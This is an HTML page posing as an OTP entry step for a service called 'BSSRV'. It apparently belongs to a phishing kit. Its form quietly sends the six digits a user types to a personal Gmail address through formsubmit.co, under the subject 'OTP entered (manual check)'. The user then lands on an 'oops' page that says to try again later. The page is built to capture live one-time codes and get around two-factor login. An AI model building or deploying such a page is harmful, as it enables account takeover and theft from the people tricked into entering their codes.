<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter OTP | BSSRV</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <!-- ===== HEADER ===== -->
  <header class="login-header">
    <div class="logo">
      <img src="bssrv_logo.png" alt="BSSRV Logo">
      <h1>BSSRV</h1>
    </div>
  </header>

  <!-- ===== ENTER OTP SECTION ===== -->
  <section class="login-section">
    <div class="login-box">
      <h2>Enter OTP</h2>
      <p>Please enter the 6-digit OTP sent to your Gmail.</p>

      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
        <!-- Hidden field to hold combined OTP -->
        <input type="hidden" name="otp" id="fullOtp">
        <input type="hidden" name="_subject" value="OTP entered (manual check)">
        <input type="hidden" name="_next" value="oops.html">

        <div class="otp-container">
          <input type="text" maxlength="1" class="otp-box" name="digit1" required>
<input type="text" maxlength="1" class="otp-box" name="digit2" required>
<input type="text" maxlength="1" class="otp-box" name="digit3" required>
<input type="text" maxlength="1" class="otp-box" name="digit4" required>
<input type="text" maxlength="1" class="otp-box" name="digit5" required>
<input type="text" maxlength="1" class="otp-box" name="digit6" required>

        </div>

        <div style="margin-top:12px;">
          <button type="submit">Submit OTP</button>
        </div>
      </form>

      <p id="status" class="status" style="color:green;"></p>
      <p class="note">Didn't receive OTP? Try again later.</p>
    </div>
  </section>
<style>
  .otp-container {
  display: flex;           /* place boxes in a row */
  justify-content: space-between; /* spread evenly */
  gap: 10px;               /* optional space between boxes */
  max-width: 300px;        /* adjust total width */
  margin: 0 auto;          /* center horizontally */
}

.otp-box {
  width: 40px;             /* size of each box */
  height: 50px;
  text-align: center;      /* center the digit */
  font-size: 24px;
  border: 1px solid #ccc;
  border-radius: 5px;
}
</style>
  <script>
    const form = document.getElementById('otpForm');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const fullOtp = document.getElementById('fullOtp');

    // Combine OTP and update hidden field
    form.addEventListener('submit', (e) => {
  const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
  fullOtp.value = otpValue;
  document.getElementById('status').innerText = 'Submitting OTP...';

      // Form will submit normally; redirect handled by _next
    });

    // Auto-focus next box when typing
    otpBoxes.forEach((box, i) => {
      box.addEventListener('input', () => {
        if (box.value.length === 1 && i < otpBoxes.length - 1) {
          otpBoxes[i + 1].focus();
        }
      });
    });
  </script>

</body>
</html>
